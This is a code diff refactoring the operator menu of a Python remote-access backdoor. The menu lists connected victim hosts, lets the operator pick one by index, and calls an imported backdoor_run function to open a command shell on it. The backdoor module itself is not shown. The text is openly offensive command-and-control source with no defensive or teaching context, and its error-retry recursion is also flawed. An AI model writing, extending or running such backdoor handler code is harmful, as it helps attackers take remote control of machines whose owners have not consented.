@@ -1,80 +1,79 @@
 from time import sleep
 from os import system
 from sys import stderr, exit
+
+
 # lib
-from .backdoor import Backdoor
+from .backdoor import *
 
-class Menu():
-    def __init__(self, cons, addrs, ip_addr, port, shell_port):
-        self.cons = cons 
-        self.addrs = addrs
-        self.ip_addr = ip_addr
-        self.port = port 
-        self.shell_port = shell_port
-        self.status = 1
 
-    def display_menu(self):
-        print("\n\n")
-        print("==== Backdoor Main Menu ====")
-        print("     ==================     ")
-        print("l  --  list connections")
-        print("x  --  execute backdoor")
-        print("c  --  clear screen")
-        print("h  --  display help menu")
-        print("q  --  quit program")
-        print("====                    ====")
+def display_menu():
+    print("\n\n")
+    print("==== Backdoor Main Menu ====")
+    print("     ==================     ")
+    print("l  --  list connections")
+    print("x  --  execute backdoor")
+    print("c  --  clear screen")
+    print("h  --  display help menu")
+    print("q  --  quit program")
+    print("====                    ====")
 
-    def wait_cmd(self):
-        cmd = ""
-        while cmd == "":
-            cmd = input(">>> ")
-        return cmd
 
-    def list_connections(self):
-            i = 0
-            print("\n\n")
-            print("====  Connections  ====")
-            for addr in self.addrs:
-                print("->  %d  --  %s  --  %d  " % (i, addr[0], addr[1]))
-                i += 1
-            print("====               ====")
+def wait_cmd():
+    cmd = ""
+    while cmd == "":
+        cmd = input(">>> ")
+    return cmd
 
-    def execute_backdoor(self):
-        self.list_connections()
-        try:
-            cmd = self.wait_cmd()
-            cmd = int(cmd)       
-        except:
-            system("clear")
-            self.execute_backdoor()
-        try:
-            con = self.cons[cmd]
-        except:
-            system("clear")
-            stderr.write("[x] Index out of bounds\n\n")
-            self.execute_backdoor()
 
-        system("clear")
-        backdoor = Backdoor(con, self.ip_addr, self.port, self.shell_port)
-        backdoor.cmd_shell()
-            
+def list_connections(addrs):
+    i = 0
+    print("\n\n")
+    print("====  Connections  ====")
+    for addr in addrs:
+        print("->  %d  --  %s  --  %d  " % (i, addr[0], addr[1]))
+        i += 1
+    print("====               ====")
 
-    def execute_cmd(self, cmd):
-        if cmd == "q":
-            self.status = 0
-        elif cmd == "l":
-            system("clear")
-            self.list_connections()
-        elif cmd == "c":
-            system("clear")
-        elif cmd == "x":
-            self.execute_backdoor()
-        else:
-            self.display_menu()
 
-    def main_menu(self):
+def execute_backdoor(cons, addrs, shell_port):
+    list_connections(addrs)
+    try:
+        cmd = wait_cmd()
+        cmd = int(cmd)
+    except:
         #system("clear")
-        self.display_menu()
-        while self.status != 0:
-            cmd = self.wait_cmd()
-            self.execute_cmd(cmd)
+        execute_backdoor(cons, addrs, shell_port)
+    try:
+        conn = cons[cmd]
+    except:
+        #system("clear")
+        stderr.write("[x] Index out of bounds\n\n")
+        execute_backdoor(cons, addrs, shell_port)
+
+    #system("clear")
+    backdoor_run(conn, shell_port)
+
+
+def execute_cmd(cons, addrs, cmd, shell_port):
+    status = 0
+    if cmd == "q":
+        status = 1
+    elif cmd == "l":
+        system("clear")
+        list_connections(addrs)
+    elif cmd == "c":
+        system("clear")
+    elif cmd == "x":
+        execute_backdoor(cons, addrs, shell_port)
+    else:
+        display_menu()
+    return status
+
+
+def main_menu(cons, addrs, ip_addr, port, shell_port):
+    status = 0
+    display_menu()
+    while status != 1:
+        cmd = wait_cmd()
+        status = execute_cmd(cons, addrs, cmd, shell_port)
